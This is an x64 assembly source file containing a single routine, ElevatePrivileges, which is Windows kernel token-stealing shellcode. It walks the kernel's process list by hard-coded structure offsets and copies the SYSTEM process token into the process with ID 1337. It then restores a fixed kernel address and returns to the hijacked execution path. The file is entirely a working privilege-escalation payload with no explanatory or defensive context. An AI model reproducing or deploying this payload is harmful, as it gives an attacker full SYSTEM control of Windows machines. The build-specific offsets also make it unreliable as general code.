.code

ElevatePrivileges PROC	
	cli

	mov rax, 9090909090909090h
	push rax

	push rdx
	push rcx

    ; Find current process
	mov rdx, gs:[188h]
    mov r8, [rdx+220h]

    mov r9, [r8+2f0h]    ; ActiveProcessLinks
    mov rcx, [r9]

	xor rbx, rbx
	xor rax, rax

find_processes:
    mov rdx, [rcx-8]     ; UniqueProcessId
    cmp rdx, 4
    jz found_system  
	cmp rdx, 1337
	jz found_process
    mov rcx, [rcx]       
    jmp find_processes

found_system:
    mov rax, [rcx+68h]   ; Token
    and al, 0f0h
	cmp rbx, 0
	jnz swap_token
	mov rcx, [rcx]
	jmp find_processes

found_process:
	lea rbx, [rcx-2f0h]
	cmp rax, 0
	jnz swap_token
	mov rcx, [rcx]
	jmp find_processes
	
swap_token:
	mov [rbx+358h], rax 

recover:
	mov rax, 0ffffffffffd00538h
	mov rbx, 9090909090909090h
	mov qword ptr [rax], rbx
	pop rcx
	pop rdx
	pop rax
	sti
	jmp rax

ElevatePrivileges ENDP

END
